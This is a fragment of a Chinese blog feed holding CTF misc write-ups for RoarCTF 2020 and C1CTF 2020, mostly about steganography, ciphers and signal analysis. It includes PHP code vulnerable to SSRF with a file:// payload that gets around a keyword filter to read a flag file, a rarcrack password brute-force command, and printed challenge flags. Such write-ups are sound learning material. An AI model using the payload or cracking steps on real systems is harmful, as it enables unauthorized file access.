        </link>
        <updated>2020-12-08T03:02:23.000Z</updated>
        <content type="html"><![CDATA[<p>有一定难度，但不是不能做，其实misc难度还算适中吧，只是都是套娃</p>
<h1 id="耗子尾汁">耗子尾汁</h1>
<p>binwalk出一个mp4视频和一个压缩包。扔进vegas逐帧查看，发现一串base64解得压缩包密码<code>sign_in</code><br>
得到一个txt，文件名是19_20.txt，应该是提示，但是我看不懂，后来才知道是仿射，还是见识过于短浅了。<br>
里面是一串b64以及<code>The last layer is the single table replacement password</code>的hint<br>
解b64，转字符串，第一次从单表替换这个概念去了解密码，无脑使用凯撒栅栏这些没有任何结果。去quipquip，没整出来，因为不会用。看flag的格式是带下划线的，但是也不会整。<br>
就差一点就出了，真的很急很气。<br>
后来询问@Hh0师傅，最后是给那串东西按照给的格式添上下划线才能解出来。</p>
<h1 id="套娃">套娃</h1>
<p>非常简单的excel，都知道excel能改成zip解压，解压出一个txt和另一个excel，看文件名知道是RC4，excel继续改文件名解压，得到一个加了密的key压缩包和又一个excel，这次这个excel解压没啥用，扔winhex看到尾部的密码，解压得到key，RC4解密</p>
<h1 id="找找吧">找找吧</h1>
<p>压缩包丢进winhex得到key，解压得一个mp3和一个rar，mp3扔audacity没用，winhex看是rar，改后缀解压出一个mp3和一个png，au打开mp3后面有摩斯电码，解出一串东西，就卡住了。<br>
后来群里讨论说是md5，找半天md5解码，要么要钱要么失败，头都秃了。没做出来<br>
后来在各方帮助下在somd5上解出<code>n1ce_try</code><br>
一个gif和一个png<br>
stegsolve逐帧播放，看到类似flag的内容，png很明显的改宽高，发现提示 <code>Veni,Vidi,Vici</code>搜了知道是凯撒，凯撒可以得flag。</p>
<h1 id="来猜谜了">来猜谜了</h1>
<p>png一张，stegsolve LSB隐写了一个压缩包，丢kali zsteg提取</p>
<pre><code>zsteg extract &quot;b1,rgb,lsb,xy&quot; problem.png &gt; flag.zip
</code></pre>
<p>一个流量包一个图片，usb流量分析，tshark没提取成功，然后就做不下去了。报错如下<br>
<img src="http://ayanagi.fun/post-images/1607398160762.png" alt="" loading="lazy"><br>
直到刚才有师傅告诉我T需要大写。我真是傻到家了。<br>
看别人的wp：<br>
提取得到的是 AG DX AG DX AG DX<br>
查了半天是解密 AGDFVX 密码的 phqgm 表，得到 gogogo然后就卡了，真的没碰到过有密码的图片隐写<br>
搜了搜有个 steghide 和 outguess，最后是用 outguess 解出来的<br>
我结合官方wp的补充：键盘脚本。<br>
得到字符串 AG DX AG DX AG DX ，是一种用ADFGX编码方式加密的字符串。通过对照表可以得到明文：gogogo，为outguess的密钥。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[RoarCTF 2020-Misc wp]]></title>
        <id>http://ayanagi.fun/Roar2020/</id>
        <link href="http://ayanagi.fun/Roar2020/">
        </link>
        <updated>2020-12-08T02:47:08.000Z</updated>
        <content type="html"><![CDATA[<p>wp部分转自</p>
<pre><code>https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485804&amp;idx=1&amp;sn=15b8b99fc9cdca98d5fa99484b776063&amp;chksm=fd711c21ca0695374a191994b75b563b1a7604b70aa3c0b0251e78721f5a24de8ff85f85284f&amp;mpshare=1&amp;scene=23&amp;srcid=1207vysHlxNfj0iTwS4Fq5Xw&amp;sharer_sharetime=1607348906792&amp;sharer_shareid=8b035134b7fe8a8160582bb9a2551229#rd
</code></pre>
<p>华丽丽的爆了零。<br>
仰慕着夏风师傅对Roar2019的精彩wp，自己做BUU也遇到了相同的题，难度不高，然后小瞧了今年的。<br>
只对misc有了解，web大概只有F12和GET/POST的水平，然后签到出不来，签到是个披着misc皮的web。</p>
<h1 id="签到">签到</h1>
<pre><code class="language-php">&lt;?php
echo &quot;&lt;!-- /?url= --&gt;&quot;;
if ($_GET['url']) {
  if (preg_match(&quot;/flag/i&quot;, $_GET['url'])) {
    die();
  }
  $curl = curl_init();

  curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($curl, CURLOPT_TIMEOUT, 500);
  curl_setopt($curl, CURLOPT_URL, $_GET['url']);

  $res = curl_exec($curl);
  curl_close($curl);
  echo $res;
}
//47.104.232.98:39390/?url=file:///%25%36%36%25%36%63%25%36%31%25%36%37
//flag{c8ff10a5edb8acb9d8ef20f8eeba19a6} 
</code></pre>
<h1 id="hi-433mhz">Hi 433MHz</h1>
<p>无线电流量分析，一看就不是我能做的题。但是看完wp乍一看也不是很难，只是第一次看见，不会分析罢了。<br>
以下是北极星战队的wp：<br>
汽车钥匙信号〜433Mhz。车钥匙信号的前导码是稳定的数据流，可以向接收者显示出实际正在被接受的数据。使用/inspectrum波形分析工具，symbols设为8个后，做相应调整，打开add sample plot选项<br>
<img src="http://ayanagi.fun/post-images/1607395887242.png" alt="" loading="lazy"><br>
我们要关注的是蓝色的波形，如果波形比较密集就代表1，比较稀疏就代表0<br>
<img src="http://ayanagi.fun/post-images/1607395903655.png" alt="" loading="lazy"><br>
然后就是慢慢的记录0、1二进制，转为ascii码就是flag</p>
<pre><code>flag{25c21b0d-6a11-4312-971b-428d01cdc534}
</code></pre>
<p>后记：其实上面的是小题大做了。<br>
刚刚看了别人的wp，直接扔进audacity里像数摩斯电码一样数就行，只不过并不是转成字符串，而是短为0长为1的二进制转ascii</p>
<h1 id="fm">FM</h1>
<p>抄别人的wp：<br>
题目给的附件是一个iq格式的文件，然后通过题目附件名称给的提示是rate=2MHZ，<br>
87-108MHZ有点东西，于是就找了很久资料，发现有一个工具gqrx-sdr是专门分析FM调频的，先安装这个软件在kali，然后打开软件设置这些参数，写入文件路径，和Bandwidth设置2MHZ，接着在里面的右边mode模式设置WFM(mono)，然后就可以听到出题人在读flag，这时只要慢慢听就能听出来flag</p>
<pre><code>flag{82c83416-dadc-4947-80df-b84852b8f35d}
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[C1CTF 2020-Misc WP]]></title>
        <id>http://ayanagi.fun/C1CTF2020/</id>
        <link href="http://ayanagi.fun/C1CTF2020/">
        </link>
        <updated>2020-12-08T02:23:51.000Z</updated>
        <content type="html"><![CDATA[<h1 id="behindme">BehindMe</h1>
<p>一看就知道是NTFS数据流隐写，盲猜隐藏的文件就是flag.txt<br>
直接</p>
<pre><code>notepad behindme.txt:flag.txt
</code></pre>
<h1 id="flag的痛">flag的痛</h1>
<p>音频文件，直接扔audacity，调高频率就能看到flag</p>
<h1 id="呜呜呜">呜呜呜</h1>
<p>winhex打开，尾巴看到7z文件，复制那部分粘贴进010保存或者dd得到一个7zip，ARCHPR无法爆破，搜了一下爆破7z文件的方法，弄了个软件给我爆出来口令是1，但是是错的，之后丢进kali</p>
<pre><code>rarcrack 1.7z --threads 4 --type 7z
</code></pre>
<p>放着爆了半天然后挂起了，心态炸了就没去做，看了hint是弱口令，但是也懒得去试，然后没出。<br>
一看官方wp其实就是123456，有点遗憾，这么简单的题目都没出来</p>
<h1 id="forever-c1">forever c1</h1>
<p>第一次见识，但是也不算第一次。使用curl发送请求在之前hackergame是有过例子的，只是不知道，也没做。<br>
以下是官方wp：<br>
指定本地客户端口号访问指定网址即可，比如使用curl</p>
<pre><code>curl 192.168.31.198:30000 --local-port 193
</code></pre>
<p>如果发现不可以，可能是因为 NAT 端口映射的原因，建议使用公网服务器。</p>
<p>当然，你也可以使用其他方法，比如：<br>
<code>使用 C/C++/Java/Python 的 Socket 编程，指定本地端口</code><br>
<code>使用 Scapy 直接构造数据包</code><br>
<code>使用 IPTables 等工具映射本地端口</code></p>
<h1 id="科学炼丹">科学炼丹</h1>
<p>看都没看，机器学习就离谱。<br>
以下是官方wp：<br>
考察点：jpg文件头、深度学习框架使用/图片相似度比较<br>
首先下载下来压缩包，可以看到test和train文件夹，并且train的每个图像文件名就是该图片上的字母，test的图像名称是从0开始编号的，对文件头比较敏感的同学应该能发现0.jpg和1.jpg两张图片结合起来是jpg的文件头FFD8FF</p>
<p>方法1<br>
第一种想法就是把这个题归类成一个机器学习的任务，train中给出了图像和它们对应的标签，所以这是一个有监督的机器学习任务，大致思路如下：</p>
<p>首先将train中的图像（大小200<em>50）分割成小份（4份大小50</em>50），放到对应标签的文件夹下<br>
通过已分割的图像和标签训练出一个模型，然后识别出test中每张图片上的数字的内容<br>
将识别出的结果严格按顺序排好，以16进制形式写入文件当中，就可以得到一张jpg图像<br>
最后得到的jpg图像就是flag：</p>
<p>方法2<br>
如果仔细观察一下给出的图像，会发现这里面每个数字或字母对应的图像都是一样的，并且相互之间有明显差别（肉眼就能分辨出来），所以还可以用另一种方式，就是图像相似度的方式来进行识别，通过对比test中每个分割后图片和train中有标签图像的相似度，确定test中图像的标签，然后写成图像</p>
<p>这道题可能是出题人的脑洞开的太大了，不光有机器学习的部分，还要熟悉jpg文件的这种文件头才能有完整的思路，而且时间也有点紧，最后大家没人做，可能还浪费了一些时间，出题人给大家道个歉qwq</p>
<p>关于最终的脚本，因为是以jupyter notebook格式写的，我把它们放到了网盘上，这里只提供了第一种思路的解题方法，只要把文件放在train和test同一目录下，按顺序执行就好，中间会多出来一些临时文件夹和一个超大的模型h5文件（因为直接调了包里的模型，参数太多了），最后生成的res_flag.jpg就是结果，如果对深度学习感兴趣可以找一下MNIST手写数字识别，这个题目算是一种改编</p>
<h1 id="base的千层套路">Base的千层套路</h1>
<p>这题和下一题都是密码学题目，但是和misc没啥区别。<br>
已经有肉眼看穿题目给的所有base的能力了，没啥难度看着解就行</p>
<h1 id="pigissocute">PigIsSoCute</h1>
<p>hint是猪圈栅栏，没难度，下载下来的txt是一个b64编码的图片，去b64转文件得到猪圈密码的图片，对着识别解密得到字符串，进行栅栏解密得到可读的明文套上<code>c1ctf{}</code>即可</p>
]]></content>
    </entry>
</feed>